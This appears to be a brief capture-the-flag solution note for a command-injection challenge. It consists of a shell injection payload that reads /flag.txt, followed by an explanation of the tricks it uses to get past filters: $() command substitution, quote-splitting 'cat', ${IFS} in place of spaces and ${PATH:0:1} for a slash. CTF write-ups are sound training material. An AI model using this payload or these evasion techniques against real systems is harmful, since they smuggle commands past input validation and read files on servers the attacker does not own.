What is the content of '/flag.txt'?
```
$(c'a't${IFS}${PATH:0:1}flag.txt)
```
- $() inserts a bash command
- c'a't evades filter
- ${IFS} for tab
- ${PATH:0:1} for /
